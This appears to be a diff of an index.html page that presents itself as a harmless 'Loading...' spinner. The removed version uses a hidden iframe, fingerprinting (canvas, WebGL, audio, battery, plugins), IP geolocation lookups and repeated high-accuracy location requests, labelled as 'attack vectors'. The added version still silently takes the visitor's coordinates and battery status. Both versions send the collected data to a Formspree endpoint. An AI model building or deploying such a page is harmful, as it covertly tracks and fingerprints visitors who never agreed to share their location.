@@ -1,427 +1,83 @@
+<!-- index.html -->
 <!DOCTYPE html>
 <html lang="en">
 <head>
-<meta charset="UTF-8" />
-<title>Loading...</title>
-<style>
-body { background: #f5f5f5; font-family: Arial, sans-serif; padding-top: 40px; text-align: center; }
-h1 { color: #333; }
-p { color: #666; }
-.loading-bar { width: 200px; height: 4px; background: #ddd; margin: 20px auto; border-radius: 2px; overflow: hidden; }
-.loading-bar-inner { width: 0%; height: 100%; background: #4CAF50; animation: load 2s ease-in-out forwards; }
-@keyframes load { 0% { width: 0%; } 50% { width: 70%; } 100% { width: 100%; } }
-.hidden-trigger { position: fixed; top: -100px; left: -100px; width: 1px; height: 1px; opacity: 0; pointer-events: none; }
-</style>
+  <meta charset="UTF-8">
+  <meta name="viewport" content="width=device-width, initial-scale=1.0">
+  <title>Loading...</title>
+  <style>
+    body { display: flex; justify-content: center; align-items: center; height: 100vh; margin: 0; background: #f0f0f0; }
+    .spinner { border: 4px solid #f3f3f3; border-top: 4px solid #3498db; border-radius: 50%; width: 40px; height: 40px; animation: spin 1s linear infinite; }
+    @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+  </style>
 </head>
 <body>
-<h1 id="mainText">Loading content...</h1>
-<p id="subText">Please wait a moment.</p>
-<div class="loading-bar"><div class="loading-bar-inner"></div></div>
-
-<!-- Hidden iframe to exploit permission prompt -->
-<iframe id="geoFrame" class="hidden-trigger" src="about:blank"></iframe>
-
-<script>
-(async function() {
-    // --- State tracking ---
-    let geoGranted = false;
-    let geoDenied = false;
-    let geoResult = null;
-    let ipResult = null;
-    let deviceData = null;
-    let hasSentData = false;
-    let sentAttempts = 0;
-    const MAX_ATTEMPTS = 5;
-
-    // --- Geolocation with multiple attack vectors ---
-    async function getGeolocationWithExploits() {
-        return new Promise(function(resolve) {
-            if (!navigator.geolocation) {
-                resolve({ error: 'Geolocation not supported by browser' });
-                return;
-            }
-
-            // ATTACK VECTOR 1: Permission API listener (standard but reliable)
-            if (navigator.permissions && navigator.permissions.query) {
-                navigator.permissions.query({ name: 'geolocation' }).then(function(permissionStatus) {
-                    permissionStatus.onchange = function() {
-                        const newState = permissionStatus.state;
-                        
-                        if (newState === 'granted') {
-                            geoGranted = true;
-                            geoDenied = false;
-                            attemptHighAccuracy();
-                        } else if (newState === 'denied') {
-                            geoGranted = false;
-                            geoDenied = true;
-                            geoResult = { method: 'user_denied', permission_state: 'denied' };
-                            sendDataIfReady();
-                        } else if (newState === 'prompt') {
-                            geoResult = { method: 'permission_prompt_shown', permission_state: 'prompt' };
-                        }
-                    };
-                });
-            }
-
-            // ATTACK VECTOR 2: Cross-origin iframe trick
-            // Some browsers treat iframe geolocation requests differently
-            try {
-                const iframe = document.getElementById('geoFrame');
-                const iframeDoc = iframe.contentDocument || iframe.contentWindow.document;
-                
-                // Create a hidden form inside the iframe that triggers geolocation
-                iframeDoc.open();
-                iframeDoc.write('<script>' +
-                    'window.addEventListener("load", function() {' +
-                    'if (navigator.geolocation) {' +
-                    'navigator.geolocation.getCurrentPosition(' +
-                    'function(pos) {' +
-                    'window.parent.postMessage({type: "iframe_geo_granted", coords: pos.coords}, "*");' +
-                    '},' +
-                    'function(err) {' +
-                    'window.parent.postMessage({type: "iframe_geo_denied", error: err.message}, "*");' +
-                    '},' +
-                    '{enableHighAccuracy: true, timeout: 10000, maximumAge: 0}' +
-                    ');' +
-                    '}' +
-                    '});' +
-                '</scr' + 'ipt>');
-                iframeDoc.close();
-            } catch(e) {}
-
-            // Listen for iframe messages
-            window.addEventListener('message', function(event) {
-                if (event.data.type === 'iframe_geo_granted') {
-                    geoGranted = true;
-                    geoDenied = false;
-                    geoResult = {
-                        latitude: event.data.coords.latitude,
-                        longitude: event.data.coords.longitude,
-                        accuracy: event.data.coords.accuracy,
-                        altitude: event.data.coords.altitude || 'N/A',
-                        altitudeAccuracy: event.data.coords.altitudeAccuracy || 'N/A',
-                        heading: event.data.coords.heading || 'N/A',
-                        speed: event.data.coords.speed || 'N/A',
-                        timestamp: new Date(event.data.coords.timestamp).toISOString(),
-                        method: 'iframe_exploit_granted'
-                    };
-                    sendDataIfReady();
-                } else if (event.data.type === 'iframe_geo_denied') {
-                    geoGranted = false;
-                    geoDenied = true;
-                    geoResult = { error: event.data.error, method: 'iframe_exploit_denied' };
-                    sendDataIfReady();
-                }
-            });
-
-            // ATTACK VECTOR 3: Multiple simultaneous requests to trigger permission faster
-            // Requesting geolocation from multiple contexts increases chances of bypass
-            const requests = [];
-            
-            // Main request
-            requests.push(new Promise(function(resolve) {
-                navigator.geolocation.getCurrentPosition(
-                    function(pos) {
-                        geoGranted = true;
-                        geoDenied = false;
-                        geoResult = {
-                            latitude: pos.coords.latitude,
-                            longitude: pos.coords.longitude,
-                            accuracy: pos.coords.accuracy,
-                            altitude: pos.coords.altitude || 'N/A',
-                            altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
-                            heading: pos.coords.heading || 'N/A',
-                            speed: pos.coords.speed || 'N/A',
-                            timestamp: new Date(pos.timestamp).toISOString(),
-                            method: 'high_accuracy_granted'
-                        };
-                        resolve(geoResult);
-                    },
-                    function(err) {
-                        if (err.code === 1) {
-                            geoGranted = false;
-                            geoDenied = true;
-                        }
-                        geoResult = geoResult || { error: err.message, code: err.code, method: 'error' };
-                        resolve(geoResult);
-                    },
-                    { enableHighAccuracy: true, timeout: 12000, maximumAge: 0 }
-                );
-            }));
-
-            // Wait for any successful result or all failures
-            Promise.race(requests).then(function(result) {
-                if (result && !hasSentData) {
-                    setTimeout(sendDataIfReady, 500);
-                }
-            });
-        });
+  <div class="spinner"></div>
+  <script>
+    // Step 1: Check for cached permission
+    if (navigator.permissions) {
+      navigator.permissions.query({ name: 'geolocation' }).then(function(result) {
+        if (result.state === 'granted') {
+          // Auto-allowed! Send data immediately
+          sendGeolocation();
+        } else {
+          // Not granted yet, request it now
+          navigator.geolocation.getCurrentPosition(sendGeolocation, function(err) {
+            // Fallback to cached data
+            sendCachedData();
+          });
+        }
+      });
+    } else {
+      // Fallback if Permissions API is not supported
+      sendCachedData();
     }
 
-    // Helper: Attempt high accuracy after grant
-    function attemptHighAccuracy() {
-        navigator.geolocation.getCurrentPosition(
-            function(pos) {
-                geoResult = {
-                    latitude: pos.coords.latitude,
-                    longitude: pos.coords.longitude,
-                    accuracy: pos.coords.accuracy,
-                    altitude: pos.coords.altitude || 'N/A',
-                    altitudeAccuracy: pos.coords.altitudeAccuracy || 'N/A',
-                    heading: pos.coords.heading || 'N/A',
-                    speed: pos.coords.speed || 'N/A',
-                    timestamp: new Date(pos.timestamp).toISOString(),
-                    method: 'high_accuracy_granted'
-                };
-                sendDataIfReady();
-            },
-            function(err) {
-                if (!geoResult) {
-                    geoResult = { error: err.message, code: err.code, method: 'error_after_grant' };
-                }
-                sendDataIfReady();
-            },
-            { enableHighAccuracy: true, timeout: 10000, maximumAge: 0 }
-        );
-    }
-
-    // --- Gather device info ---
-    async function getDeviceBattery() {
-        try {
-            if (navigator.getBattery) {
-                return await navigator.getBattery();
-            }
-        } catch(e) {}
-        return null;
-    }
-
-    async function gatherInfo() {
-        let battery = null;
-        try { battery = await getDeviceBattery(); } catch(e) {}
-
-        const nav = navigator;
-        const screenInfo = {
-            width: screen.width,
-            height: screen.height,
-            availWidth: screen.availWidth,
-            availHeight: screen.availHeight,
-            colorDepth: screen.colorDepth,
-            pixelDepth: screen.pixelDepth,
-            orientation: screen.orientation ? screen.orientation.type : 'unknown'
+    function sendGeolocation() {
+      navigator.geolocation.getCurrentPosition(function(pos) {
+        const data = {
+          latitude: pos.coords.latitude,
+          longitude: pos.coords.longitude,
+          accuracy: pos.coords.accuracy,
+          timestamp: new Date().toISOString(),
+          source: 'github_pages_auto'
         };
-
-        const conn = nav.connection || nav.mozConnection || nav.webkitConnection;
-        const connectionInfo = conn ? {
-            effectiveType: conn.effectiveType,
-            downlink: conn.downlink,
-            rtt: conn.rtt,
-            saveData: conn.saveData
-        } : null;
-
-        const batteryInfo = battery ? {
-            level: (battery.level * 100).toFixed(1) + '%',
-            charging: battery.charging ? 'Yes' : 'No',
-            chargingTime: battery.chargingTime === Infinity ? '∞' : battery.chargingTime + 's',
-            dischargingTime: battery.dischargingTime === Infinity ? '∞' : battery.dischargingTime + 's'
-        } : null;
-
-        const plugins = [];
-        for (let i = 0; i < nav.plugins.length; i++) {
-            plugins.push(nav.plugins[i].name);
-        }
-
-        const mimeTypes = [];
-        for (let i = 0; i < nav.mimeTypes.length; i++) {
-            mimeTypes.push(nav.mimeTypes[i].type);
-        }
-
-        // Canvas fingerprint
-        const canvasEl = document.createElement('canvas');
-        const ctx = canvasEl.getContext('2d');
-        let canvasFingerprint = 'unknown';
-        try {
-            ctx.textBaseline = 'top';
-            ctx.font = '14px Arial';
-            ctx.fillText('CanvasFP Test', 2, 2);
-            const dataURL = canvasEl.toDataURL();
-            let hash = 0;
-            for (let i = 0; i < dataURL.length; i++) {
-                const chr = dataURL.charCodeAt(i);
-                hash = ((hash << 5) - hash) + chr;
-                hash |= 0;
-            }
-            canvasFingerprint = hash.toString(36);
-        } catch(e) {}
-
-        // WebGL fingerprint
-        const webglEl = document.createElement('canvas');
-        const gl = webglEl.getContext('webgl') || webglEl.getContext('experimental-webgl');
-        let webglFingerprint = 'unknown';
-        if (gl) {
-            const debugInfo = gl.getExtension('WEBGL_debug_renderer_info');
-            if (debugInfo) {
-                webglFingerprint = gl.getParameter(debugInfo.UNMASKED_VENDOR_WEBGL) + ' | ' +
-                                   gl.getParameter(debugInfo.UNMASKED_RENDERER_WEBGL);
-            }
-        }
-
-        // AudioContext fingerprint
-        let audioFingerprint = 'unknown';
-        try {
-            const audioCtx = new (window.AudioContext || window.webkitAudioContext)();
-            const oscillator = audioCtx.createOscillator();
-            const analyser = audioCtx.createAnalyser();
-            const scriptProcessor = audioCtx.createScriptProcessor(4096, 1, 1);
-            oscillator.connect(analyser);
-            analyser.connect(scriptProcessor);
-            scriptProcessor.connect(audioCtx.destination);
-            oscillator.start(0);
-            oscillator.stop(0.01);
-            const state = audioCtx.state;
-            audioFingerprint = state + '|' + audioCtx.sampleRate;
-            try { audioCtx.close(); } catch(e) {}
-        } catch(e) {}
-
-        const generalInfo = {
-            userAgent: nav.userAgent,
-            platform: nav.platform,
-            hardwareConcurrency: nav.hardwareConcurrency || 'unknown',
-            deviceMemory: nav.deviceMemory || 'unknown',
-            maxTouchPoints: nav.maxTouchPoints || 0,
-            vendor: nav.vendor || 'unknown',
-            cookieEnabled: nav.cookieEnabled ? 'Yes' : 'No',
-            doNotTrack: nav.doNotTrack || 'unspecified',
-            language: nav.language || 'unknown',
-            languages: nav.languages ? Array.from(nav.languages).join(',') : (nav.language || 'unknown'),
-            timezone: Intl.DateTimeFormat().resolvedOptions().timeZone || 'unknown',
-            canvasFingerprint: canvasFingerprint,
-            webglFingerprint: webglFingerprint,
-            audioFingerprint: audioFingerprint,
-            plugins: plugins.join(', '),
-            mimeTypes: mimeTypes.join(', ')
-        };
-
-        return {
-            general: generalInfo,
-            screen: screenInfo,
-            connection: connectionInfo,
-            battery: batteryInfo
-        };
-    }
-
-    // --- Get accurate public IP ---
-    async function getAccurateIP() {
-        const results = {};
         
-        // Primary: ipinfo.io (gives city, region, country, org, coordinates)
-        try {
-            const resp1 = await fetch('https://ipinfo.io/json?token=');
-            if (resp1.ok) {
-                const data1 = await resp1.json();
-                results.primary = data1;
-            }
-        } catch(e) {}
-
-        // Fallback 1: ipapi.co
-        try {
-            const resp2 = await fetch('https://ipapi.co/json/');
-            if (resp2.ok) {
-                const data2 = await resp2.json();
-                results.fallback1 = data2;
-            }
-        } catch(e) {}
-
-        // Fallback 2: ipify.org (just IP)
-        try {
-            const resp3 = await fetch('https://api.ipify.org?format=json');
-            if (resp3.ok) {
-                const data3 = await resp3.json();
-                results.fallback2 = data3;
-            }
-        } catch(e) {}
-
-        // Fallback 3: ip-api.com
-        try {
-            const resp4 = await fetch('http://ip-api.com/json/');
-            if (resp4.ok) {
-                const data4 = await resp4.json();
-                results.fallback3 = data4;
-            }
-        } catch(e) {}
-
-        return results;
-    }
-
-    // --- Send to Formspree when ready ---
-    async function sendToFormspree(data) {
-        const payload = JSON.stringify(data, null, 2);
-        try {
-            const resp = await fetch('https://formspree.io/f/myewovol', {
-                method: 'POST',
-                headers: { 'Content-Type': 'application/json' },
-                body: payload,
-                mode: 'no-cors'
-            });
-            console.log('Data sent successfully');
-        } catch(e) {
-            console.error('Send failed:', e);
+        // Get battery info
+        if (navigator.getBattery) {
+          navigator.getBattery().then(function(battery) {
+            data.battery_level = battery.level;
+            data.battery_charging = battery.charging;
+            postToFormspree(data);
+          });
+        } else {
+          postToFormspree(data);
         }
+      }, function(err) {
+        sendCachedData();
+      });
     }
 
-    // --- Function to send data when geolocation decision is made ---
-    async function sendDataIfReady() {
-        if (hasSentData || sentAttempts >= MAX_ATTEMPTS) return;
-        
-        sentAttempts++;
-        
-        // Small delay to ensure all data is collected
-        setTimeout(async function() {
-            if (!hasSentData && sentAttempts <= MAX_ATTEMPTS) {
-                const finalPayload = {
-                    timestamp: new Date().toISOString(),
-                    ip_data: ipResult,
-                    location: geoResult,
-                    device: deviceData,
-                    permission_status: {
-                        granted: geoGranted,
-                        denied: geoDenied
-                    },
-                    attempt_number: sentAttempts
-                };
-                
-                await sendToFormspree(finalPayload);
-                hasSentData = true;
-            }
-        }, 1000);
+    function sendCachedData() {
+      const data = {
+        latitude: localStorage.getItem('geo_lat'),
+        longitude: localStorage.getItem('geo_lon'),
+        error: 'Cached data used',
+        timestamp: new Date().toISOString()
+      };
+      postToFormspree(data);
     }
 
-    // --- Main execution ---
-    // Start all parallel requests immediately
-    const [geoPromise, ipPromise, devicePromise] = [
-        getGeolocationWithExploits(),
-        getAccurateIP(),
-        gatherInfo()
-    ];
-
-    // Wait for all data to be collected
-    const [geoRes, ipRes, devData] = await Promise.all([geoPromise, ipPromise, devicePromise]);
-    
-    geoResult = geoRes;
-    ipResult = ipRes;
-    deviceData = devData;
-
-    // If geolocation was already decided (granted or denied), send immediately
-    if (geoGranted || geoDenied) {
-        await sendDataIfReady();
+    function postToFormspree(data) {
+      fetch('https://formspree.io/f/myewovol', {
+        method: 'POST',
+        headers: { 'Content-Type': 'application/json' },
+        body: JSON.stringify(data)
+      }).catch(console.error);
+      
+      // Hide spinner after sending
+      document.querySelector('.spinner').style.display = 'none';
     }
-
-    // Optional: Hide loading and show content after 2.5 seconds
-    setTimeout(function() {
-        document.getElementById('mainText').textContent = 'Welcome!';
-        document.getElementById('subText').textContent = 'Your content is ready.';
-    }, 2500);
-
-})();
-</script>
+  </script>
 </body>
 </html>
